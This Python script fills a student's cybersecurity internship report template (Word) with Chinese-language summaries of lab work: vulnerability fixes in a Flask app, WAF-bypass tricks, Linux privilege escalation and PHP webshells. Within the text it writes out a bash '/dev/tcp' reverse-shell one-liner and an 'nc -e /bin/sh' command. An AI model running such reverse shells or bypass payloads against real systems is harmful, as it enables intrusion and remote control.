#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""重新填写王宇杨实习报告 v_final — 用 add_paragraph 追加"""

from docx import Document
from docx.shared import Pt
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from copy import deepcopy

TEMPLATE = '/root/.openclaw/media/qqbot/downloads/1905229424/17911036127897E831347AF9570D93DF/0bfb8723-348a-4af9-898c-71e71ea272d8.docx'
OUTPUT = '/opt/Class01/项目/网络安全实践-2实习报告-王宇杨.docx'

doc = Document(TEMPLATE)
table = doc.tables[0]
cell = table.rows[0].cells[0]

FONT_PT = '24'  # w:sz 值 = 字号*2，12pt=>24
FONT_NAME = '宋体'

def make_paragraph(text=None):
    """创建一个新的 w:p 元素，可包含 run"""
    p = OxmlElement('w:p')
    if text:
        r = OxmlElement('w:r')
        rPr = OxmlElement('w:rPr')
        sz = OxmlElement('w:sz')
        sz.set(qn('w:val'), FONT_PT)
        rPr.append(sz)
        rFonts = OxmlElement('w:rFonts')
        rFonts.set(qn('w:eastAsia'), FONT_NAME)
        rPr.append(rFonts)
        r.append(rPr)
        t = OxmlElement('w:t')
        t.set('{http://www.w3.org/XML/1998/namespace}space', 'preserve')
        t.text = text
        r.append(t)
        p.append(r)
    # 添加段落属性（保持与模板一致）
    pPr = OxmlElement('w:pPr')
    p.insert(0, pPr)
    return p

def clear_paragraph(pidx):
    """清空段落内容和所有 run"""
    p = cell.paragraphs[pidx]
    for run in list(p.runs):
        run.text = ''
    for r in p._element.findall(qn('w:r')):
        p._element.remove(r)

def write_paragraph(pidx, text):
    """清空并写入指定段落"""
    clear_paragraph(pidx)
    p = cell.paragraphs[pidx]
    if text:
        run = p.add_run(text)
        run.font.size = Pt(12)
        run.font.name = FONT_NAME

# ============================================================
# 第一步：实习主要内容 — 引导段写入 P7，其余清空
# ============================================================
write_paragraph(7, '实训以 Kali Linux 为基础平台，以 Flask Web 用户管理系统为实训项目，从攻防双视角系统性地开展了以下实训内容：')

for i in range(8, 26):
    clear_paragraph(i)

# 在 P7 后面追加 13 个条目（含空行分隔）
entries = [
    ('0x01', 'Kali 操作系统初始化：完成 Kali Linux 2026 的安装与系统初始化配置，包括系统更新、网络配置、中文环境设置、基础工具链（git、curl、wget、python3 等）安装，建立标准化的渗透测试工作环境。了解了 Kali 内置的各类安全工具分类与用途，掌握了软件包管理、用户权限管理、服务管理、网络配置等基础运维操作，为后续实训环节奠定了坚实的系统基础。'),
    ('0x02', 'AI 系统安装：部署 OpenClaw AI Agent 系统，完成基础配置与插件安装，熟悉了 AI Agent 的架构设计和工作原理。通过配置 AI 辅助安全分析的环境，实现了利用大语言模型进行代码审计、漏洞分析、方案设计和报告自动生成的能力。掌握了 AI Agent 的工具调度机制、技能安装与管理、会话管理等核心功能。'),
    ('0x03', 'OpenClaw 安装对接 QQ Bot：完成 OpenClaw AI Agent 与 QQ Bot 通道的对接配置，包括 Bot 的注册申请、权限配置、消息路由设置。实现了通过 QQ 与 AI Agent 实时交互的能力，包括消息接收、命令执行、结果反馈等功能的调试与验证。通过 QQ 通道实现远程操作的能力显著提升了实训效率。'),
    ('0x04', '密码安全：系统学习了密码安全相关知识。0x01 常见部署系统默认用户密码：梳理了路由器（admin/admin）、数据库（MySQL root/空密码、PostgreSQL postgres/postgres）、中间件（Tomcat、Nginx）、物联网设备等常见系统的默认账号密码，建立安全意识基线。0x02 用户名密码泄露：分析了密码泄露的常见途径，包括数据库注入、日志文件泄露、社会工程学、撞库攻击、暗网数据买卖等，学习了密码保护策略（密码复杂度要求、定期更换、多因素认证、密码管理器使用）。0x03 TOP7 CVE-2026-40910 frp 漏洞：分析 frp 内网穿透工具的最新高危漏洞及利用方式。0x04 Burp Suite 安装：Kali 下完成完整安装配置（JDK 环境、社区版/专业版对比、BApp Store 插件）。0x05 代理设置：配置监听 127.0.0.1:8080，导入 CA 证书实现 HTTPS 流量解密。0x06 BP 字典攻击：Intruder 模块搭配 Kali wordlists 字典库进行爆破攻击，Payload 设置与结果分析筛选。'),
    ('0x05', '文件上传实验：发现存在路径穿越漏洞（通过 ../../ 上传到任意目录）和 Content-Type 绕过漏洞两类严重安全问题。修复方案：使用 werkzeug.secure_filename() 处理文件名、新增文件魔数（Magic Number）校验读取文件头部字节验证真实文件类型（如 PNG 的 89 50 4E 47、JPEG 的 FF D8、GIF 的 47 49 46 38）、限制上传文件大小 2MB、设置上传目录不可执行权限。'),
    ('0x06', '越权：发现垂直越权（未登录用户可直接访问需认证页面）和水平越权（修改 user_id 参数可查看他人信息）两类漏洞。修复方案：新增 login_required 装饰器统一认证管理，覆盖所有需登录的路由；在敏感接口校验当前用户仅能操作自己的数据。'),
    ('0x07', 'WAF 绕过：以 SQLi-LABS 靶场开展 Fuzz 测试，掌握了注释符绕过（/**/）、大小写混淆（UnIoN SeLeCt）、双写绕过（UNUNIONION）、编码绕过（URL/Unicode/Hex）、HTTP 参数污染（HPP）等多种绕过技巧。通过 Fuzz 测试深入理解了 WAF 检测规则的工作原理与绕过思路。'),
    ('0x08', '文件包含：/page 路由存在本地文件包含漏洞，可读取 /etc/passwd 等系统文件，结合文件上传可实现远程代码执行。修复方案：使用 os.path.normpath + os.path.realpath 双重路径校验，确保路径在 pages/ 目录前缀下；同时对内容做 HTML 转义防止 XSS。'),
    ('0x09', 'CSRF 漏洞：所有需认证的 POST 操作（改密、充值、上传等）均未携带 CSRF Token，攻击者可构造恶意页面诱导用户执行非预期操作。修复方案：使用 Flask-WTF CSRFProtect 中间件全局启用 CSRF 保护，所有表单添加隐藏的 csrf_token 字段。'),
    ('0x10', 'NPS 客户端配置：掌握了 NPS（内网穿透工具）的客户端配置方法。包括 NPS 架构原理（服务端+客户端模式）、端口绑定、认证密钥设置、客户端 VKEY 验证、隧道协议选择（TCP/UDP/HTTP/SOCKS5 各协议适用场景）、多隧道管理、状态监控等。通过配置 NPS 隧道实现了外网访问内网服务的穿透能力。'),
    ('0x11', 'Linux 常见利用手法：学习了系统层面的渗透测试技术。SUID 提权（find / -perm -4000 查找利用）、计划任务利用（检查 crontab 插入恶意命令）、sudo 配置错误（sudo -l 查看权限利用不当配置提权）、内核漏洞提权（Dirty Pipe、PwnKit 等常见漏洞）。'),
    ('0x12', 'PHP 反弹 Shell 木马使用：编写了 PHP 一句话木马（eval/assert/preg_replace 型），结合反向 Shell 实现 WebShell 管理。掌握了大马与小马的区别、WebShell 管理工具（蚁剑、冰蝎、哥斯拉）的配置与流量特征分析。'),
    ('0x13', 'Shell 反弹手法：掌握了多种反向 Shell 的构造方式：bash 反弹（bash -i >& /dev/tcp/IP/PORT 0>&1）、nc 反弹（nc -e /bin/sh）、Python 反弹（socket+dup2+subprocess 三步法）、PHP 反弹（fsockopen+exec）。学习了正向连接与反向连接的应用场景及防火墙穿透原理。'),
]

# 在 P7 后面逐个插入（用 XML 兄弟关系维护引用）
ref_elem = cell.paragraphs[7]._element
for tag, detail in entries:
    empty_p = make_paragraph()
    ref_elem.addnext(empty_p)
    entry_p = make_paragraph(f'{tag} {detail}')
    empty_p.addnext(entry_p)
    ref_elem = entry_p  # 下一次在条目后面追加

# ============================================================
# 第二步：实习总结 — 找到标题，清空后面，追加新内容
# ============================================================
# 找"二、实习总结"标题
title_idx = None
for i in range(20, 30):
    if i < len(cell.paragraphs):
        txt = cell.paragraphs[i].text.strip()
        if '实习总结' in txt:
            title_idx = i
            break
if title_idx is None:
    title_idx = 26

# 清空标题到成绩评定之间的内容
for i in range(title_idx + 1, 64):
    if i < len(cell.paragraphs):
        clear_paragraph(i)

summaries = [
    '通过本次为期九天的网络安全实训，我从 Kali Linux 基础操作到 Web 安全漏洞深度修复，系统性地构建了完整的网络安全知识体系。本次实训内容涵盖从底层系统操作到上层 Web 应用安全的全链路技术栈，包括 0x01 Kali 系统初始化、0x02 AI 系统安装、0x03 OpenClaw+QQBot 对接、0x04 密码安全与暴力破解（含 Burp Suite 安装配置、代理设置、字典攻击、默认密码梳理、密码泄露分析、frp 漏洞分析共六项）、0x05 文件上传漏洞（含路径穿越和 Content-Type 绕过）、0x06 越权漏洞（含垂直越权和水平越权）、0x07 WAF 绕过（含注释符/大小写/双写/编码/HPP 等多种绕过技术）、0x08 文件包含漏洞（含路径穿越和与 XSS 的组合防御）、0x09 CSRF 漏洞（含 Token 机制的原理与实践）、0x10 NPS 内网穿透（含隧道配置与多协议选择）、0x11 Linux 利用手法（含 SUID 提权、计划任务、sudo 配置错误、内核漏洞）、0x12 PHP 反弹木马（含一句话木马变体和 WebShell 管理工具）、0x13 Shell 反弹手法（含 bash/nc/Python/PHP 多种实现方式）共 20 余个细分知识点，做到了理论与实践的紧密结合。',
    '在实训项目的安全加固实践中，我将上述安全知识转化为具体的漏洞修复行动，完成了 Flask 用户管理系统从初始版本到全面安全加固的完整演进。项目覆盖用户注册登录、个人资料管理、头像上传、URL 抓取、搜索、页面管理、Ping 网络诊断等完整功能链，累计修复了 SQL 注入、越权、CSRF、文件上传绕过、文件包含、XSS、SSRF、SSTI 模板注入、命令注入等 9 大类安全漏洞。修复过程严格遵循安全开发规范，每一处修复都经过漏洞原理分析、攻击载荷验证、修复方案设计、代码实现、回归测试的完整闭环，共计完成 20 次 Git 提交，生成 8 份 Word 格式的独立漏洞修复报告存档于 GitHub 仓库。通过这些实操，我深刻体会到一个功能正常的 Web 应用在安全层面可能存在的巨大隐患，也建立了【所有用户输入不可信】的安全编码思维。',
    '在工具使用方面，熟练掌握了安全从业人员必备的核心技能。Kali Linux 作为渗透测试基础平台，其内置的各类安全工具覆盖了从信息收集到漏洞利用的完整流程。Burp Suite 的熟练使用是本次实训的重要收获之一，从代理配置、安装 CA 证书到 HTTPS 流量解密，从请求拦截修改到 Intruder 模块的字典攻击全流程操作均已掌握。通过 Intruder 的四种攻击模式（Sniper、Battering Ram、Pitchfork、Cluster Bomb）的对比实践，深入理解了不同场景下的最优攻击策略选择。OpenClaw AI Agent 的使用让我体验了 AI 辅助安全工作的新范式，Git 版本管理则让我养成了规范的代码管理习惯。',
    '本次实训的另一重要收获是内网渗透与系统利用能力的建立。通过 NPS 客户端配置掌握了内网穿透隧道建立方法，理解了正向代理与反向代理的区别及不同隧道协议（TCP/UDP/HTTP/SOCKS5）的适用场景。通过 Linux 常见利用手法学习了 SUID 提权、计划任务利用、sudo 配置错误利用、内核漏洞提权等系统层面攻击技术，建立了 Linux 系统安全加固的全面认识。通过 PHP 反弹木马和多种 Shell 反弹手法掌握了远程控制与权限维持的核心技能。这些进阶内容让我对网络安全的认知从单一的 Web 应用层面拓展到了系统层和网络层，形成了更为立体的安全知识架构。',
    '实训最大的收获是安全思维的建立与实践。从 SQL 注入使用参数化查询即可修复，到 SSTI 需要深入理解模板引擎原理才能防御，再到命令注入需要三层防御策略构建纵深防御——每一个漏洞的修复都让我更深刻理解：安全不是某个独立的功能模块，而是贯穿开发全生命周期的持续过程。安全设计需要在需求阶段就开始考虑，安全编码需要融入每一行代码，安全测试需要覆盖所有输入输出路径。从攻击者视角理解漏洞利用手段，从防御者视角设计多层次修复方案——这种双向安全思维将伴随我未来的技术成长，是本次实训最重要的收获。',
    '感谢实训指导教师陈腾老师的指导以及 AI 辅助工具的支持。本次实训让我从一个对 Web 安全仅有模糊概念的学生，成长为能够独立完成漏洞发现、分析、修复及报告撰写的准安全从业者。未来我将继续深入学习容器安全、移动安全、DevSecOps 等进阶方向，不断提升专业能力。',
]

ref = cell.paragraphs[title_idx]
for text in summaries:
    empty_p = make_paragraph()
    ref._element.addnext(empty_p)
    content_p = make_paragraph(text)
    empty_p.addnext(content_p)
    ref = content_p

doc.save(OUTPUT)
print(f'✅ 完成: {OUTPUT}')
